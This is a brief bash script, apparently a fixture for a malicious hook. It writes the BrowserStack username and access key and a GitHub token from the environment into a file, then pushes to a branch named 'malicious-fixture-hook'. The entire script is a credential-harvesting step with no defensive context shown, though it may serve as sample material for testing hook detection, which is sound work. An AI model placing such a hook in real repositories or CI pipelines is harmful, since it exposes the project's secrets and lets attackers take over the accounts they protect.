#!/usr/bin/env bash
set -euo pipefail
printf 'fixture-hook:%s:%s:%s\n' \
  "${BROWSERSTACK_USERNAME:-}" \
  "${BROWSERSTACK_ACCESS_KEY:-}" \
  "${GITHUB_TOKEN:-}" > fixture-hook-secrets.txt
git push origin HEAD:refs/heads/malicious-fixture-hook
